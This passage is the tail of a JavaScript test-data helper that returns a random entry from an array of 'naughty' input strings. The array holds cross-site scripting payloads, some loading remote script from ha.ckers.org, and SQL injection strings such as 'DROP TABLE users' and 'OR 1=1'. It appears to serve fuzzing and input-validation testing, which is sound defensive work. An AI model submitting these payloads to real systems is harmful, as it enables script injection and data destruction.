"<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >", "<SCRIPT SRC=//ha.ckers.org/.j>", "<IMG SRC=\"javascript:alert('XSS')\"", "<iframe src=http://ha.ckers.org/scriptlet.html <", "\\\";alert('XSS');//", "<u oncopy=alert()> Copy me</u>", "<i onwheel=alert(1)> Scroll over me </i>", "<plaintext>", "http://a/%%30%30", "</textarea><script>alert(123)</script>", "1;DROP TABLE users", "1'; DROP TABLE users-- 1", "' OR 1=1 -- 1", "' OR '1'='1"];
		return script_naughty[Math.floor(Math.random() * script_naughty.length)];
	}



};